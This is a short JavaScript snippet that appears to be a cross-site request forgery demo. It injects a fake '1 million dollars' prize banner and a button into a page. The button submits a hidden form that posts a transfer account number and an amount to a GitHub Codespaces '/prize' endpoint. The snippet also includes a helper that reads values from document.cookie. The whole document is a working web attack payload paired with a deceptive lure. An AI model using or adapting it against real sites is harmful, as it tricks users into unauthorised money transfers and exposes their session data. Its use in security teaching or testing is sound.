

const html = "<h1>Congratulations. You just won a bonus of 1 million dollars!!!</h1>" +
    "<form action=\"https://supreme-meme-7j6v5x4qqr3w69g-3001.app.github.dev/prize\" method=\"post\">" +
    "<input type=\"hidden\" name=\"TransferAccount\" value=\"9876865434\" />" +
    "<input type=\"hidden\" name=\"Amount\" value=\"1000\" />" +
    "<input type=\"submit\" value=\"Click here to claim your bonus\"/>" +
    "</form>";

const childs = new DOMParser().parseFromString(html, 'text/html').body.children;

console.log(childs)

for (const child of [...childs]) {
    document.body.appendChild(child);
}

function getCookie(cookiename) {
    var cookiestring = RegExp(cookiename + "=[^;]+").exec(document.cookie);

    return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./, "") : "");
}
